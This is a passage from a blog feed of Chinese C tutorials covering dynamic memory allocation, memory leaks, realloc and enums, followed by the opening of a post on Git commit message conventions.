class="type">int</span>));</span><br><span class="line"><span class="keyword">if</span>(arr == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// malloc调用失败,未能成功分配内存.(大部分情况下不会发生)</span></span><br><span class="line"><span class="comment">// 打印数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">arr[i] = i + <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 打印数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="comment">// 使用free函数释放内存,该函数无需内存的实际长度,因为堆内存的长度由操作系统来管理.</span></span><br><span class="line"><span class="built_in">free</span>(arr);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240330105442786.png" alt="image-20240330105442786" style="zoom: 67%;" /><p>显然可以看到,在这段内存分配后,就已经被初始化(用0填充).</p><h2 id="释放堆内存">释放堆内存</h2><h3 id="free函数">free函数</h3><p>想要释放一段内存十分简单,只要使用<code>free</code>函数,并传入其首地址即可.</p><p>函数原型:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">( <span class="type">void</span>* ptr )</span>;</span><br></pre></td></tr></table></figure><p>注意:</p><ul><li>如果<code>ptr</code>参数为空指针,则<code>free</code>函数不进行操作.</li><li>如果<code>ptr</code>参数的值并非由<code>malloc</code>,<code>calloc</code>,<code>realloc</code>等函数返回,则行为未定义.例如ptr执行某个普通的局部变量,此时ptr指向的是栈内存!</li><li>若 <code>ptr</code> 所指代的内存区域已经被<code>解分配</code>,则行为未定义.所谓<code>解分配</code>,即已经对ptr调用了<code>free</code>等函数.(注:根据标准,情况并不止free函数一种,请参阅文档<a href="https://zh.cppreference.com/w/c/memory/free">free - cppreference.com</a>)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">例如:</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">#include &lt;stdlib.h&gt; // 需要包含stdlib.h头文件</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">int *mem = (int *)malloc(sizeof(int) * 10);</span><br><span class="line">for(int i = 0; i &lt; 10; i++)</span><br><span class="line">mem[i] = i;</span><br><span class="line">for(int i = 0; i &lt; 10; i++)</span><br><span class="line">printf(&quot;%d &quot;, mem[i]);</span><br><span class="line">free(mem); // 将mem指向的堆内存释放掉</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="内存泄漏问题">内存泄漏问题</h3><p>我们在使用完一段内存后,一定要对其进行释放,否则这段内存会&quot;丢失&quot;,即我们的程序不再使用这段内存,但是操作系统认为程序请求了这段内存,所以这段内存是无法被释放的,也就会被持续占用,这种情况叫做<code>内存泄漏</code>.</p><p>当然,如果我们的程序很短,在用完这段内存之后很快就运行结束了,而不主动释放内存,那么在程序结束后,堆内存会自动进行释放,而不是仍然&quot;丢失&quot;.但是很多程序往往需要运行很长时间,例如服务器上运行的一些程序,往往数个月都在运行,此时如果发生内存泄漏,带来的问题是非常大的,程序请求的内存会被一直<code>占用</code>,但是程序本身却并不使用它.</p><p>更严重的是,由于分配的堆内存需要使用一个指针来记录,如果程序直接将该指针指向其他位置,例如重新分配一段堆内存.那么原来那段内存就是真正的丢失了,因为我们无法找回这段内存的位置,自然也就无法进行释放.唯一的办法就是在程序退出后由操作系统回收.</p><p>举个例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> <span class="comment">// 需要包含stdlib.h头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 内存泄漏问题</span></span><br><span class="line"><span class="type">int</span> *mem = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> count = <span class="number">10000</span>;</span><br><span class="line"><span class="comment">// 申请了count次内存,但是只使用了最后一次申请的内存</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">mem = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*<span class="number">10</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;++i)</span><br><span class="line">mem[i] = i;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;++i)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, mem[i]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段程序是可以运行的,但是问题显而易见,前9999次分配的内存在运行时全部丢失(如果均分配成功的话),原因在于,程序中访问分配的内存的唯一方法是使用<code>mem</code>指针进行访问,但是程序的循环中,每次分配内存都让mem指向新的堆内存,这就导致我们已经无法访问到原来的内存.</p><p>此时即时我们有心想要将之前分配的内存释放掉,也已经无法做到.只要程序不退出,这9999次内存就依然被这个程序&quot;占用&quot;,但是实际情况是,连程序本身都无法再访问到它们,更别提释放.</p><p>我们只能等待程序运行结束后,让操作系统来进行回收.</p><h2 id="扩容堆内存">扩容堆内存</h2><p>堆内存的一个特点便是灵活,C语言标准库还提供了<code>realloc</code>函数,以实现堆内存的扩容,当我们已经分配好的一段堆内存不够用时,可以使用<code>realloc</code>函数进行扩容.</p><h3 id="realloc函数">realloc函数</h3><p><code>realloc</code>函数用于重新分配给定的内存区域,但是需要注意,该函数有许多需要注意的问题!</p><p>函数原型:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">realloc</span><span class="params">( <span class="type">void</span> *ptr, <span class="type">size_t</span> new_size )</span>;</span><br></pre></td></tr></table></figure><p>其中:</p><ul><li>ptr: 指向需要重新分配的内存区域的指针</li><li>new_size: 数组的新大小(字节数)</li><li>返回值: 返回指向新分配内存的指针,原指针<code>ptr</code>失效.</li></ul><p>注意:</p><ul><li>函数执行成功时,返回指向新分配内存的指针,同样,返回的指针后续依旧需要进行释放. 原指针<code>ptr</code>失效,再次对其进行访问是<code>未定义的</code>,即使重分配在就地.</li><li>函数执行失败时,返回空指针,原指针<code>ptr</code>保持有效,后续依旧需要释放.</li><li>如果参数<code>ptr</code>为非<code>NULL</code>,则它必须是<code>malloc</code>,<code>calloc</code>或<code>realloc</code>函数所分配,并且尚未被<code>free</code>或<code>realloc</code>函数释放. 否则,<code>结果未定义</code>.</li><li>若参数<code>ptr</code>为<code>NULL</code>,则行为与调用<code>malloc(new_size)</code>相同.否则:</li><li>若<code>new_size</code>为零,则行为<code>由实现定义</code>(可能返回空指针,该情况下可能或可能不释放旧内存,或可能返回某个不能用于访问存储的非空指针), (<code>注意</code>:该用法在C17起被弃用,并且在C23之后变成<code>行为未定义</code>!)</li></ul><p>重分配操作有2种执行方法,按其中之一执行:</p><ol><li>可能的话,扩张或收缩<code>ptr</code>所指向的现有内存区域. 新旧大小中的较小者范围内的区域的内容保持不变. 若扩张范围,则数组新增部分的内容是未定义的.</li><li>分配一个大小为<code>new_size</code>节的新内存块,并复制大小等于新旧大小中较小者的内存区域,然后释放旧内存块.</li></ol><p>若无足够内存,则不释放旧内存块,返回<code>空指针</code>.</p><p>以上就是<code>realloc</code>函数绝大部分需要注意的问题,当然作为初学者,只要正常地使用,一般并无太大问题. 一般情况下都是可以正确执行的,但是决不能完全信任它,因此我们依旧需要进行检查.</p><p>下面是一个例子,分配一段堆内存来存储10个整数,后续将其扩容以存储20个整数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 使用malloc分配内存空间，存储10个整数</span></span><br><span class="line">    <span class="type">int</span>* ptr = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">10</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查内存是否成功分配</span></span><br><span class="line">    <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory allocation failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        ptr[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印原始数组</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Before realloc:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, ptr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用realloc扩大内存空间，现在可以存储20个整数</span></span><br><span class="line">    ptr = (<span class="type">int</span>*)<span class="built_in">realloc</span>(ptr, <span class="number">20</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查内存是否成功重新分配</span></span><br><span class="line">    <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory reallocation failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在新的内存空间添加额外的10个整数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">10</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">        ptr[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印扩大后的数组</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After realloc:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, ptr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放内存</span></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240405031132.png" alt="image.png|525"><br>最后,同样需要对其进行释放.</p><h1 id="内存泄漏问题">内存泄漏问题</h1><p><code>内存泄漏(memory leak)</code>问题并不仅仅是C语言要考虑的问题,而是任何编程语言都需要注意的问题.</p><p>所有使用<code>malloc</code>,<code>calloc</code>等函数分配的堆内存,在使用之后必须进行释放,否则程序便会一直占用该内存段.</p><h3 id="一个简单的例子">一个简单的例子</h3><p>我们考虑一个内存泄漏的简单例子,在这个例子中,我们有一个程序A,存储n个单词(长度不超过100),代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_LEN 100  <span class="comment">// 定义字符串的最大长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> n;  <span class="comment">// 用来存储用户输入的字符串数量</span></span><br><span class="line">    <span class="type">char</span> *p;  <span class="comment">// 用来指向动态分配的字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);  <span class="comment">// 从用户获取字符串数量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="comment">// 为每个字符串动态分配内存，长度为MAX_LEN + 1（包括字符串结束符&#x27;\0&#x27;）</span></span><br><span class="line">        p = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>) * (MAX_LEN + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, p);  <span class="comment">// 从用户获取字符串</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(p);  <span class="comment">// 输出字符串</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p);  <span class="comment">// 释放最后分配的字符串内存</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行这个程序,简单地测试一下:<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240406031945.png" alt="image.png|344"><br>看起来没有问题,然而,这里发生了内存泄漏,我们来跟踪一下:</p><ol><li>首先,我们输入<code>3</code>,则循环执行3次,每次循环都分配一段内存,并接受一个单词,然后输出:<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240406032225.png" alt="image.png|475"></li><li>第一次循环中,为p分配了第一段内存<code>M1</code>,存储第一个单词<code>&quot;i&quot;</code>,并输出.循环体结束后如下所示:<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240406032428.png" alt="image.png|475"></li><li>第二次循环中,为p分配了第二段内存<code>M2</code>,存储第二个单词<code>&quot;love&quot;</code>,并输出.循环体结束后如下所示:<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240406032529.png" alt="image.png|475"><br>然而,必须注意,此时并没有进行<code>free</code>函数的调用,因此<code>M1</code>依旧存在,并且操作系统认为程序A依然持有着该内存!问题是,指针<code>p</code>已经指向了新的<code>M2</code>,<code>M1</code>的指针已经丢失,因此程序A实际上已经无法找回该内存!</li><li>第三次循环中,为p分配了第三段内存<code>M2</code>,存储第三个单词<code>&quot;world&quot;</code>,并输出.循环体结束后如下所示:<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240406032907.png" alt="image.png|475"><br>同理,<code>M1</code>和<code>M2</code>此时均丢失!现在,该退出循环了.</li><li>执行<code>free</code>函数,释放掉p当前指向的堆内存,结果如下所示:<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240406033631.png" alt="image.png|475"></li><li>执行<code>return 0;</code>退出程序. 此时由操作系统来负责回收<code>M1</code>和<code>M2</code>:<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240406034406.png" alt="|475"><br>到此,<code>内存泄漏</code>才算结束,因为程序(进程)结束后,操作系统会去回收内存.</li></ol><p>如上所述,这是一个很简单的例子,在运行过程中发生了<code>内存泄漏</code>,该例子中,<code>M1</code>和<code>M2</code>的指针被销毁(覆盖),导致两段内存丢失(从程序A的视角来看),然而,只要程序A仍然在运行,这2段内存一直是被占用的(从操作系统的视角来看).</p><p>最后,程序仅仅正常释放了<code>M3</code>,而<code>M1</code>和<code>M2</code>是由操作系统回收的. 由于程序太短(这是个简单的例子),可能并无大碍.</p><p>但是,如果有类似问题的程序,它是运行在服务器上的一个关键程序,往往需要几天乃至数个月不停止运行,并且每次分配的内存量很大. 那么,即使计算机的内存再大,也会被这程序&quot;败光&quot;很大资源.</p><p>换句话说,只要这程序不结束,那么被占用的内存就一直无法被释放,然而这个有问题的程序自己早已不再使用这段内存,甚至已经丢失掉了(正如上面那个例子所示),这样的话,被&quot;泄漏&quot;的内存就会一直空闲,却无法被使用.</p><p>因此,<code>内存泄漏</code>是一个非常重要的问题,像C语言这种没有<code>垃圾回收</code>功能的语言,必须认真对待!</p><p>注:</p><ol><li><code>垃圾回收</code>: 自动进行内存管理,将无用的内存释放掉,而无需用户(程序员)手动管理释放.</li><li>并不是一定要丢失指针才会发生内存泄漏,如果某段内存从程序逻辑上不再使用,却并不释放,这也叫<code>内存泄漏</code>.</li><li>内存泄漏也有着许多种类和原因,具体视情况不同,严重程度也不同. 这里不再赘述.</li></ol><br>本章讲解了C语言的`动态内存管理`相关的函数,与`内存泄漏`这一问题.动态内存(堆内存)和栈内存都是非常重要的内存分配方式,各有优缺点,在实际应用时,要视情况不同来进行选择. 这一内容的详细讨论则超出了本教程的讨论范畴.<p>本教程基于<code>C99</code>进行讲解,关于新标准(例如<code>C11</code>,<code>C17</code>,<code>C23</code>)在动态内存管理方面还有着许多新内容,具体请参阅<code>Cppreference</code>文档.<br><br></p><p align=right>——WAHAHA 2024.4.6</p><br><br><p>上一篇:<a href="../202434c442170e12">C语言教程-14_5-枚举</a><br>下一篇:<a href="../20249964b6b49f5c">C语言教程-15_2-存储期,作用域与链接</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-14_5-枚举</title>
      <link href="/202434c442170e12/"/>
      <url>/202434c442170e12/</url>
      
        <content type="html"><![CDATA[<p>前置知识:</p><ol><li>常量</li></ol><h1 id="枚举的声明和使用">枚举的声明和使用</h1><p>我们有时需要使用一系列相关的常量,使用<code>#define</code>来逐个定义相对较麻烦,C语言提供了<code>枚举类型</code>,来声明一系列枚举常量.</p><h2 id="声明一个枚举类型">声明一个枚举类型</h2><p>声明一个枚举类型的语法如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> &lt;</span>标识符&gt;&#123;枚举项列表&#125;;</span><br></pre></td></tr></table></figure><p>其中:</p><ul><li>标识符: 该枚举类型的名称</li><li>枚举项列表: 用逗号分隔的若干个枚举项,每个枚举项可以有如下2种形式:<ul><li>枚举常量 属性声明符</li><li>枚举常量 属性声明符 = 常量表达式</li></ul></li></ul><p>作为初学者,我们无需关心<code>属性声明符</code>,现阶段将他忽略掉即可.</p><p><code>枚举常量</code>也是一个标识符,他代表了一个具体的枚举常量名.</p><p><code>常量表达式</code>则必须是一个整数常量表达式,其值应该为<code>int</code>类型,用于指示对应枚举常量的值.</p><p>同样,以上声明仅是声明了一个<code>枚举类型</code>,我们接下来可以使用该类型来声明若干个变量.</p><h2 id="声明枚举的变量">声明枚举的变量</h2><p>假设我们声明一个枚举类型来用于红绿灯的状态表示:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">light</span>&#123;</span>RED,YELLOW,GREEN&#125;;</span><br></pre></td></tr></table></figure><p>该枚举可以表示一个信号灯的3种状态,我们接下来使用该枚举类型来&quot;描述&quot;3个信号灯:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">light</span>&#123;</span>RED,YELLOW,GREEN&#125;;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">light</span> <span class="title">light1</span>,<span class="title">light2</span>,<span class="title">light3</span>;</span></span><br><span class="line">light1 = RED;</span><br><span class="line">light2 = YELLOW;</span><br><span class="line">light3 = GREEN;</span><br></pre></td></tr></table></figure><p>同样,我们也可以直接将枚举light的3个枚举常量视为3个整数常量,用于比较:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">light</span>&#123;</span>RED,YELLOW,GREEN&#125;;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">light</span> <span class="title">light1</span>=</span>RED;</span><br><span class="line"><span class="keyword">if</span>(light1 == GREEN)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;允许通行!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(light1 == RED)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请等待!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;注意!&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="枚举常量的值">枚举常量的值</h2><p>我们在声明枚举的时候,可以为特定的<code>枚举常量</code>使用一个<code>整数常量表达式</code>来指定其值.</p><p>枚举常量的值遵循如下规则:</p><ol><li><p>如果一个枚举常量提供了 <code> =常量表达式</code> ,那么该常量的值即为该表达式的值.</p></li><li><p>如果一个枚举常量未提供 <code>=常量表达式</code> ,那么该常量的值为同一枚举中前一枚举项的值再+1.</p></li><li><p>特别地,如果<code>第一个</code>枚举常量未提供 <code>=常量表达式</code> ,那么默认为0.</p></li><li><p>如果某个枚举常量由其前一个常量的值+1来指定,并且该值发生了<code>溢出</code>或<code>回绕</code>,那么他将会:</p><ol><li>适当大小的有符号整数类型,且有能力表示其前一个常量的值+1</li><li>适当大小的无符号整数类型,且有能力表示其前一个常量的值+1</li></ol><p>具体的类型选择取决于其前一个常量的类型,如果不存在这样的可以表示新值的类型,则该枚举不正确(?).</p></li></ol><p>我们举个例子即可基本说明:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">color</span> &#123;</span> RED, ORANGE = <span class="number">3</span>, YELLOW, GREEN = <span class="number">6</span>, BLUE, PURPLE &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;RED = %d &quot;</span>, RED); <span class="comment">// 第一个枚举成员,未指定值,默认为0</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ORANGE = %d &quot;</span>, ORANGE); <span class="comment">// 第二个枚举成员,指定值为3</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;YELLOW = %d &quot;</span>, YELLOW); <span class="comment">//未指定值,默认为前一个成员的值+1,即4</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;GREEN = %d &quot;</span>, GREEN); <span class="comment">// 第四个枚举成员,指定值为6</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;BLUE = %d &quot;</span>, BLUE); <span class="comment">// 未指定值,默认为前一个成员的值+1,即7</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PURPLE = %d &quot;</span>, PURPLE); <span class="comment">// 未指定值,默认为前一个成员的值+1,即8</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RED = 0 ORANGE = 3 YELLOW = 4 GREEN = 6 BLUE = 7 PURPLE = 8</span><br></pre></td></tr></table></figure><br><p>枚举实际上现在用的不是很多,视情况可以选择使用枚举.</p><p>注:以上内容为C99标准,C23起有一些新的内容,参阅cppreference文档.</p><p align=right>——WAHAHA 2024.3.5</p><br><br><p>上一篇:<a href="../2024f9a5468d726b">C语言教程-14_4-共用体</a><br>下一篇:<a href="../20243aebb4efa9ab">C语言教程-15_1-动态内存分配</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github提交规范</title>
      <link href="/20248befcc09ef89/"/>
      <url>/20248befcc09ef89/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么要规定提交规范">为什么要规定提交规范</h1><p>团队协作开发时,每个人提交都会编写自己的<code>commit message</code>.</p><p>如果不加以规范,最终项目就会杂乱不堪,难以管理.</p><p>一般的大厂,大型开源项目的<code>commit message</code>格式是非常一致的,便于管理,提高效率.</p><h1 id="git提交规范">Git提交规范</h1><h2 id="commitizen规范">commitizen规范</h2><p>该规范有3个部分:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;type&gt;(&lt;scope&gt;): subject</span><br><span class="line"><span class="comment">// 空行</span></span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="comment">// 空行</span></span><br><span class="line">&lt;footer&gt;</span><br></pre></td></tr></table></figure><p>后两部分可以省略.</p><h3 id="type">type</h3><p>必须,用于说明类型,有如下类型.</p><ul><li>feat: 